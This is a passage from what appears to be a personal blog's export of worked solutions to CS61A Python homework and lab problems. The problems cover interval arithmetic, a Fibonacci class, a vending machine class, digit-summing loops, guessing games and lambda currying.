<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">par1</span><span class="params">(r1, r2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> div_interval(mul_interval(r1, r2), add_interval(r1, r2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">par2</span><span class="params">(r1, r2)</span>:</span></span><br><span class="line">    one = interval(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    rep_r1 = div_interval(one, r1)</span><br><span class="line">    rep_r2 = div_interval(one, r2)</span><br><span class="line">    <span class="keyword">return</span> div_interval(one, add_interval(rep_r1, rep_r2))</span><br></pre></td></tr></table></figure>
<p>Lem complains that Alyssa’s program gives different answers for the two ways of computing. This is a serious complaint.</p>
<p>Demonstrate that Lem is right. Investigate the behavior of the system on a variety of arithmetic expressions. Make some intervals <code>r1</code> and <code>r2</code>, and show that <code>par1</code> and <code>par2</code> can give different results.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_par</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return two intervals that give different results for parallel resistors.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r1, r2 = check_par()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x = par1(r1, r2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; y = par2(r1, r2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lower_bound(x) != lower_bound(y) or upper_bound(x) != upper_bound(y)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    r1 = interval(<span class="number">1</span>, <span class="number">1</span>) <span class="comment"># Replace this line!</span></span><br><span class="line">    r2 = interval(<span class="number">1</span>, <span class="number">1</span>) <span class="comment"># Replace this line!</span></span><br><span class="line">    <span class="keyword">return</span> r1, r2</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_par</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return two intervals that give different results for parallel resistors.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r1, r2 = check_par()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x = par1(r1, r2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; y = par2(r1, r2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lower_bound(x) != lower_bound(y) or upper_bound(x) != upper_bound(y)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    r1 = interval(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    r2 = interval(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> r1, r2</span><br></pre></td></tr></table></figure>
<p>Video walkthrough: <a href="https://youtu.be/H8slb5KCbU4" target="_blank" rel="noopener">https://youtu.be/H8slb5KCbU4</a></p>
<h2 id="Q14-Multiple-References"><a href="#Q14-Multiple-References" class="headerlink" title="Q14: Multiple References"></a>Q14: Multiple References</h2><p>Eva Lu Ator, another user, has also noticed the different intervals computed by different but algebraically equivalent expressions. She says that the problem is multiple references to the same interval.</p>
<p>The Multiple References Problem: a formula to compute with intervals using Alyssa’s system will produce tighter error bounds if it can be written in such a form that no variable that represents an uncertain number is repeated.</p>
<p>Thus, she says, par2 is a better program for parallel resistances than par1. Is she right? Why? Write a function that returns a string containing a written explanation of your answer:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiple_references_explanation</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""The multiple reference problem exists.  The true value</span></span><br><span class="line"><span class="string">    within a particular interval is fixed (though unknown).  Nested</span></span><br><span class="line"><span class="string">    combinations that refer to the same interval twice may assume two different</span></span><br><span class="line"><span class="string">    true values for the same interval, which is an error that results in</span></span><br><span class="line"><span class="string">    intervals that are larger than they should be.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Consider the case of i * i, where i is an interval from -1 to 1.  No value</span></span><br><span class="line"><span class="string">    within this interval, when squared, will give a negative result.  However,</span></span><br><span class="line"><span class="string">    our mul_interval function will allow us to choose 1 from the first</span></span><br><span class="line"><span class="string">    reference to i and -1 from the second, giving an erroneous lower bound of</span></span><br><span class="line"><span class="string">    -1.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Hence, a program like par2 is better than par1 because it never combines</span></span><br><span class="line"><span class="string">    the same interval more than once.</span></span><br><span class="line"><span class="string">    """</span></span><br></pre></td></tr></table></figure>
<p>Video walkthrough: <a href="https://youtu.be/H8slb5KCbU4" target="_blank" rel="noopener">https://youtu.be/H8slb5KCbU4</a></p>
<h2 id="Q15-Quadratic"><a href="#Q15-Quadratic" class="headerlink" title="Q15: Quadratic"></a>Q15: Quadratic</h2><p>Write a function <code>quadratic</code> that returns the interval of all values f(t) such that t is in the argument interval x and f(t) is a quadratic function:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f(t) &#x3D; a*t*t + b*t + c</span><br></pre></td></tr></table></figure>
<p>Make sure that your implementation returns the smallest such interval, one that does not suffer from the multiple references problem.</p>
<p>Hint: the derivative <code>f&#39;(t) = 2*a*t + b</code>, and so the extreme point of the quadratic is <code>-b/(2*a)</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quadratic</span><span class="params">(x, a, b, c)</span>:</span></span><br><span class="line">    <span class="string">"""Return the interval that is the range of the quadratic defined by</span></span><br><span class="line"><span class="string">    coefficients a, b, and c, for domain interval x.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; str_interval(quadratic(interval(0, 2), -2, 3, -1))</span></span><br><span class="line"><span class="string">    '-3 to 0.125'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; str_interval(quadratic(interval(1, 3), 2, -3, 1))</span></span><br><span class="line"><span class="string">    '0 to 10'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    extremum = -b / (<span class="number">2</span>*a)</span><br><span class="line">    f = <span class="keyword">lambda</span> x: a * x * x + b * x + c</span><br><span class="line">    l, u, e = map(f, (lower_bound(x), upper_bound(x), extremum))</span><br><span class="line">    <span class="keyword">if</span> extremum &gt;= lower_bound(x) <span class="keyword">and</span> extremum &lt;= upper_bound(x):</span><br><span class="line">        <span class="keyword">return</span> interval(min(l, u, e), max(l, u, e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> interval(min(l, u), max(l, u))</span><br></pre></td></tr></table></figure>
<p>Video walkthrough: <a href="https://youtu.be/qgSn_RNBs4A" target="_blank" rel="noopener">https://youtu.be/qgSn_RNBs4A</a></p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw06</title>
    <url>/2018/10/22/cs61a-hw06/</url>
    <content><![CDATA[<h1 id="Object-Oriented-Programming"><a href="#Object-Oriented-Programming" class="headerlink" title="Object Oriented Programming"></a>Object Oriented Programming</h1><h2 id="Q1-Next-Fibonacci-Object"><a href="#Q1-Next-Fibonacci-Object" class="headerlink" title="Q1: Next Fibonacci Object"></a>Q1: Next Fibonacci Object</h2><p>Implement the <code>next</code> method of the <code>Fib</code> class. For this class, the <code>value</code> attribute is a Fibonacci number. The <code>next</code> method returns a <code>Fib</code> instance whose <code>value</code> is the next Fibonacci number. The <code>next</code> method should take only constant time.</p>
<p>Note that in the doctests, nothing is being printed out. Rather, each call to <code>.next()</code> returns a <code>Fib</code> instance, which is represented in the interpreter as the value of that instance (see the <code>__repr__</code> method).</p>
<p>Hint: Keep track of the previous number by setting a new instance attribute inside next.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fib</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""A Fibonacci number.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start = Fib()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next()</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next()</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next().next()</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next().next().next()</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next().next().next().next()</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next().next().next().next().next()</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; start.next().next().next().next().next().next() # Ensure start isn't changed</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        <span class="keyword">if</span> self.value == <span class="number">0</span>:</span><br><span class="line">            result = Fib(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = Fib(self.value + self.previous)</span><br><span class="line">        result.previous = self.value</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> str(self.value)</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Remember that next must return a Fibonacci object! With this in mind, our first goal is to calculate the next Fibonacci object and return it. One approach is to figure out the base case (self.value == 0) and then decide what information is needed for the following call to next.</span></p>
<p><span style="color:red">You might also note that storing the current value makes the solution look very similar to the iterative version of the fib problem.</span></p>
<p><span style="color:red">Video walkthrough: <a href="https://youtu.be/-_bn87W4oOE" target="_blank" rel="noopener">https://youtu.be/-_bn87W4oOE</a></span></p>
<h2 id="Q2-Vending-Machine"><a href="#Q2-Vending-Machine" class="headerlink" title="Q2: Vending Machine"></a>Q2: Vending Machine</h2><p>Create a class called <code>VendingMachine</code> that represents a vending machine for some product. A <code>VendingMachine</code> object returns strings describing its interactions. See the doctest below for examples:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VendingMachine</span>:</span></span><br><span class="line">    <span class="string">"""A vending machine that vends some product for some price.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v = VendingMachine('candy', 10)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.vend()</span></span><br><span class="line"><span class="string">    'Machine is out of stock.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.deposit(15)</span></span><br><span class="line"><span class="string">    'Machine is out of stock. Here is your $15.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.restock(2)</span></span><br><span class="line"><span class="string">    'Current candy stock: 2'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.vend()</span></span><br><span class="line"><span class="string">    'You must deposit $10 more.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.deposit(7)</span></span><br><span class="line"><span class="string">    'Current balance: $7'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.vend()</span></span><br><span class="line"><span class="string">    'You must deposit $3 more.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.deposit(5)</span></span><br><span class="line"><span class="string">    'Current balance: $12'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.vend()</span></span><br><span class="line"><span class="string">    'Here is your candy and $2 change.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.deposit(10)</span></span><br><span class="line"><span class="string">    'Current balance: $10'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.vend()</span></span><br><span class="line"><span class="string">    'Here is your candy.'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; v.deposit(15)</span></span><br><span class="line"><span class="string">    'Machine is out of stock. Here is your $15.'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w = VendingMachine('soda', 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w.restock(3)</span></span><br><span class="line"><span class="string">    'Current soda stock: 3'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w.restock(3)</span></span><br><span class="line"><span class="string">    'Current soda stock: 6'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w.deposit(2)</span></span><br><span class="line"><span class="string">    'Current balance: $2'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w.vend()</span></span><br><span class="line"><span class="string">    'Here is your soda.'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, product, price)</span>:</span></span><br><span class="line">        self.product = product</span><br><span class="line">        self.price = price</span><br><span class="line">        self.stock = <span class="number">0</span></span><br><span class="line">        self.balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restock</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        self.stock += n</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Current &#123;0&#125; stock: &#123;1&#125;'</span>.format(self.product, self.stock)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.stock == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Machine is out of stock. Here is your $&#123;0&#125;.'</span>.format(n)</span><br><span class="line">        self.balance += n</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Current balance: $&#123;0&#125;'</span>.format(self.balance)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vend</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.stock == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Machine is out of stock.'</span></span><br><span class="line">        difference = self.price - self.balance</span><br><span class="line">        <span class="keyword">if</span> difference &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'You must deposit $&#123;0&#125; more.'</span>.format(difference)</span><br><span class="line">        message = <span class="string">'Here is your &#123;0&#125;'</span>.format(self.product)</span><br><span class="line">        <span class="keyword">if</span> difference != <span class="number">0</span>:</span><br><span class="line">            message += <span class="string">' and $&#123;0&#125; change'</span>.format(-difference)</span><br><span class="line">        self.balance = <span class="number">0</span></span><br><span class="line">        self.stock -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> message + <span class="string">'.'</span></span><br></pre></td></tr></table></figure>
<p>You may find Python string formatting syntax useful. A quick example:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ten, twenty, thirty = <span class="number">10</span>, <span class="string">'twenty'</span>, [<span class="number">30</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;0&#125; plus &#123;1&#125; is &#123;2&#125;'</span>.format(ten, twenty, thirty)</span><br><span class="line"><span class="string">'10 plus twenty is [30]'</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab01</title>
    <url>/2018/08/24/cs61a-lab01/</url>
    <content><![CDATA[<h1 id="Q4-Sum-Digits"><a href="#Q4-Sum-Digits" class="headerlink" title="Q4: Sum Digits"></a>Q4: Sum Digits</h1><p>Write a function that takes in a nonnegative integer and sums its digits. (Using floor division and modulo might be helpful here!)</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_digits</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Sum all the digits of n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_digits(10) # 1 + 0 = 1</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_digits(4224) # 4 + 2 + 2 + 4 = 12</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_digits(1234567890)</span></span><br><span class="line"><span class="string">    45</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># n, sum = n // 10, sum + n % 10</span></span><br><span class="line">        n, d = n // <span class="number">10</span>, n % <span class="number">10</span></span><br><span class="line">        sum += d</span><br><span class="line">    <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<h1 id="Q6-Falling-Factorial"><a href="#Q6-Falling-Factorial" class="headerlink" title="Q6: Falling Factorial"></a>Q6: Falling Factorial</h1><p>Let’s write a function falling, which is a “falling” factorial that takes two arguments, n and k, and returns the product of k consecutive numbers, starting from n and working downwards.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">falling</span><span class="params">(n, k)</span>:</span></span><br><span class="line">    <span class="string">"""Compute the falling factorial of n to depth k.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; falling(6, 3)  # 6 * 5 * 4</span></span><br><span class="line"><span class="string">    120</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; falling(4, 0)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; falling(4, 3)  # 4 * 3 * 2</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; falling(4, 1)  # 4</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    fac = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        fac, k = n * fac, k - <span class="number">1</span></span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fac</span><br></pre></td></tr></table></figure>
<h1 id="Q7-Double-Eights"><a href="#Q7-Double-Eights" class="headerlink" title="Q7: Double Eights"></a>Q7: Double Eights</h1><p>Write a function that takes in a number and determines if the digits contain two adjacent 8s.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_eights</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return true if n has two eights in a row.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(8)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(88)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(2882)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(880088)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(12345)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double_eights(80808080)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n, d = n // <span class="number">10</span>, n % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">8</span> <span class="keyword">and</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> d == <span class="number">8</span>:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h1 id="I-Want-to-Play-a-Game"><a href="#I-Want-to-Play-a-Game" class="headerlink" title="I Want to Play a Game"></a>I Want to Play a Game</h1><p>Now that you have learned about call expressions and control structures, you can code an algorithm! An algorithm is a set of steps to accomplish a task. You use algorithms every day – from adding numbers by hand to getting to your next lecture.</p>
<p>Let’s play a number guessing game with Python! Pick a number and Python will guess randomly until it guesses correctly.</p>
<p>All the code for this guessing game will be in lab01_extra.py. In your terminal, start an interactive session with Python:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -i lab01_extra.py</span><br></pre></td></tr></table></figure>
<p>The guess_random function will prompt you for a number, ask if its guess is correct (many times) and return the number of guesses Python had to make. To tell Python if its guess is correct, just enter y at the [y/n] prompt. If it’s wrong, enter n. Python isn’t very good at guessing yet, so if it’s taking too long, you can type Ctrl-C to make it stop.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; guess_random()</span><br><span class="line">Pick an integer between 1 and 10 (inclusive) for me to guess: 7</span><br><span class="line">Is 1 your number? [y&#x2F;n] n</span><br><span class="line">Is 5 your number? [y&#x2F;n] n</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Randomly guessing works, but you can create an even better guessing strategy.</p>
<h2 id="Q8-Guess-Linear"><a href="#Q8-Guess-Linear" class="headerlink" title="Q8: Guess Linear"></a>Q8: Guess Linear</h2><p>One weakness in the guess_random strategy is that it can repeat (incorrect) guesses. Rather than guessing wildly, let’s guess numbers in increasing order.</p>
<p>Note: is_correct is a function that will ask the user if the guess is correct and return True if the user confirms that the guess matches the correct number. Feel free to reference the implementation of guess_random as you implement guess_linear.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_linear</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Guess in increasing order and return the number of guesses."""</span></span><br><span class="line">    prompt_for_number(LOWER, UPPER)</span><br><span class="line">    num_guesses = <span class="number">1</span></span><br><span class="line">    guess = LOWER</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> is_correct(guess):</span><br><span class="line">        guess, num_guesses = guess + <span class="number">1</span>, num_guesses + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num_guesses</span><br></pre></td></tr></table></figure>

<h2 id="Q9-Guess-Binary"><a href="#Q9-Guess-Binary" class="headerlink" title="Q9: Guess Binary"></a>Q9: Guess Binary</h2><p>Challenge question. The guess_linear function can take a long time if your number is large. However, a strategy called binary search can find the correct number faster. The idea is to start in the middle of the range and after each incorrect guess ask if the guess is_too_high or too low. Either way, you can eliminate half the remaining possible guesses.</p>
<p>Hint: Try using the is_too_high function to implement a faster strategy. is_too_high will return True if the guess is greater than the correct number.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; result &#x3D; is_too_high(5)</span><br><span class="line">Is 5 too high? [y&#x2F;n] y</span><br><span class="line">&gt;&gt;&gt; result</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<p>Hint: You may want to update other variables besides guess.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_binary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return the number of attempted guesses. Implement a faster search</span></span><br><span class="line"><span class="string">    algorithm that asks the user whether a guess is less than or greater than</span></span><br><span class="line"><span class="string">    the correct number.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Hint: If you know the guess is greater than the correct number, then your</span></span><br><span class="line"><span class="string">    algorithm doesn't need to try numbers that are greater than guess.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    prompt_for_number(LOWER, UPPER)</span><br><span class="line">    num_guesses = <span class="number">1</span></span><br><span class="line">    lower, upper = LOWER, UPPER</span><br><span class="line">    guess = (lower + upper) // <span class="number">2</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> is_correct(guess):</span><br><span class="line">        <span class="keyword">if</span> is_too_high(guess):</span><br><span class="line">            upper = guess - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = guess + <span class="number">1</span></span><br><span class="line">        guess = (lower + upper) // <span class="number">2</span></span><br><span class="line">        num_guesses += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num_guesses</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab02</title>
    <url>/2018/08/29/cs61a-lab02/</url>
    <content><![CDATA[<h1 id="Q3-Lambdas-and-Currying"><a href="#Q3-Lambdas-and-Currying" class="headerlink" title="Q3: Lambdas and Currying"></a>Q3: Lambdas and Currying</h1><p>We can transform multiple-argument functions into a chain of single-argument, higher order functions by taking advantage of lambda expressions. This is useful when dealing with functions that take only single-argument functions. We will see some examples of these later on.</p>
<a id="more"></a>
<p>Write a function lambda_curry2 that will curry any two argument function using lambdas. See the doctest or refer to the textbook if you’re not sure what this means.</p>
<p>Your solution to this problem should fit entirely on the return line. You can try writing it first without this restriction, but rewrite it after in one line to test your understanding of this topic.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lambda_curry2</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns a Curried version of a two-argument function FUNC.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from operator import add</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; curried_add = lambda_curry2(add)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_three = curried_add(3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_three(5)</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: func(x, y)</span><br></pre></td></tr></table></figure>

<h1 id="Q4-Make-Adder"><a href="#Q4-Make-Adder" class="headerlink" title="Q4: Make Adder"></a>Q4: Make Adder</h1><p>Draw the environment diagram for the following code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">9</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_adder</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> k: k + n</span><br><span class="line">add_ten = make_adder(n+<span class="number">1</span>)</span><br><span class="line">result = add_ten(n)</span><br></pre></td></tr></table></figure>
<p>There are 3 frames total (including the Global frame). In addition, consider the following questions:</p>
<ul>
<li><p>In the Global frame, the name add_ten points to a function object. What is the intrinsic name of that function object, and what frame is its parent?</p>
</li>
<li><p>In frame f2, what name is the frame labeled with (add_ten or λ)? Which frame is the parent of f2?</p>
</li>
<li><p>What value is the variable result bound to in the Global frame?</p>

</li>
<li><p>The intrinsic name of the function object that add_ten points to is λ (specifically, the lambda whose parameter is k). The parent frame of this lambda is f1.</p>
</li>
<li><p>f2 is labeled with the name λ the parent frame of f2 is f1, since that is where λ is defined.</p>
</li>
<li><p>The variable result is bound to 19.</p>
</li>
</ul>
<h1 id="Q5-Lambda-the-Environment-Diagram"><a href="#Q5-Lambda-the-Environment-Diagram" class="headerlink" title="Q5: Lambda the Environment Diagram"></a>Q5: Lambda the Environment Diagram</h1><p>Try drawing an environment diagram for the following code and predict what Python will output.</p>
<p>You do not need to submit or unlock this question through Ok. Instead, you can check your work with the Online Python Tutor, but try drawing it yourself first!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; lambda x: x * 2 + 1</span><br><span class="line">&gt;&gt;&gt; def b(b, x):</span><br><span class="line">...     return b(x + a(x))</span><br><span class="line">&gt;&gt;&gt; x &#x3D; 3</span><br><span class="line">&gt;&gt;&gt; b(a, x)</span><br><span class="line">21</span><br></pre></td></tr></table></figure>

<h1 id="Q6-Composite-Identity-Function"><a href="#Q6-Composite-Identity-Function" class="headerlink" title="Q6: Composite Identity Function"></a>Q6: Composite Identity Function</h1><p>Write a function that takes in two single-argument functions, f and g, and returns another function that has a single parameter x. The returned function should return True if f(g(x)) is equal to g(f(x)). You can assume the output of g(x) is a valid input for f and vice versa. You may use the compose1 function defined below.</p>
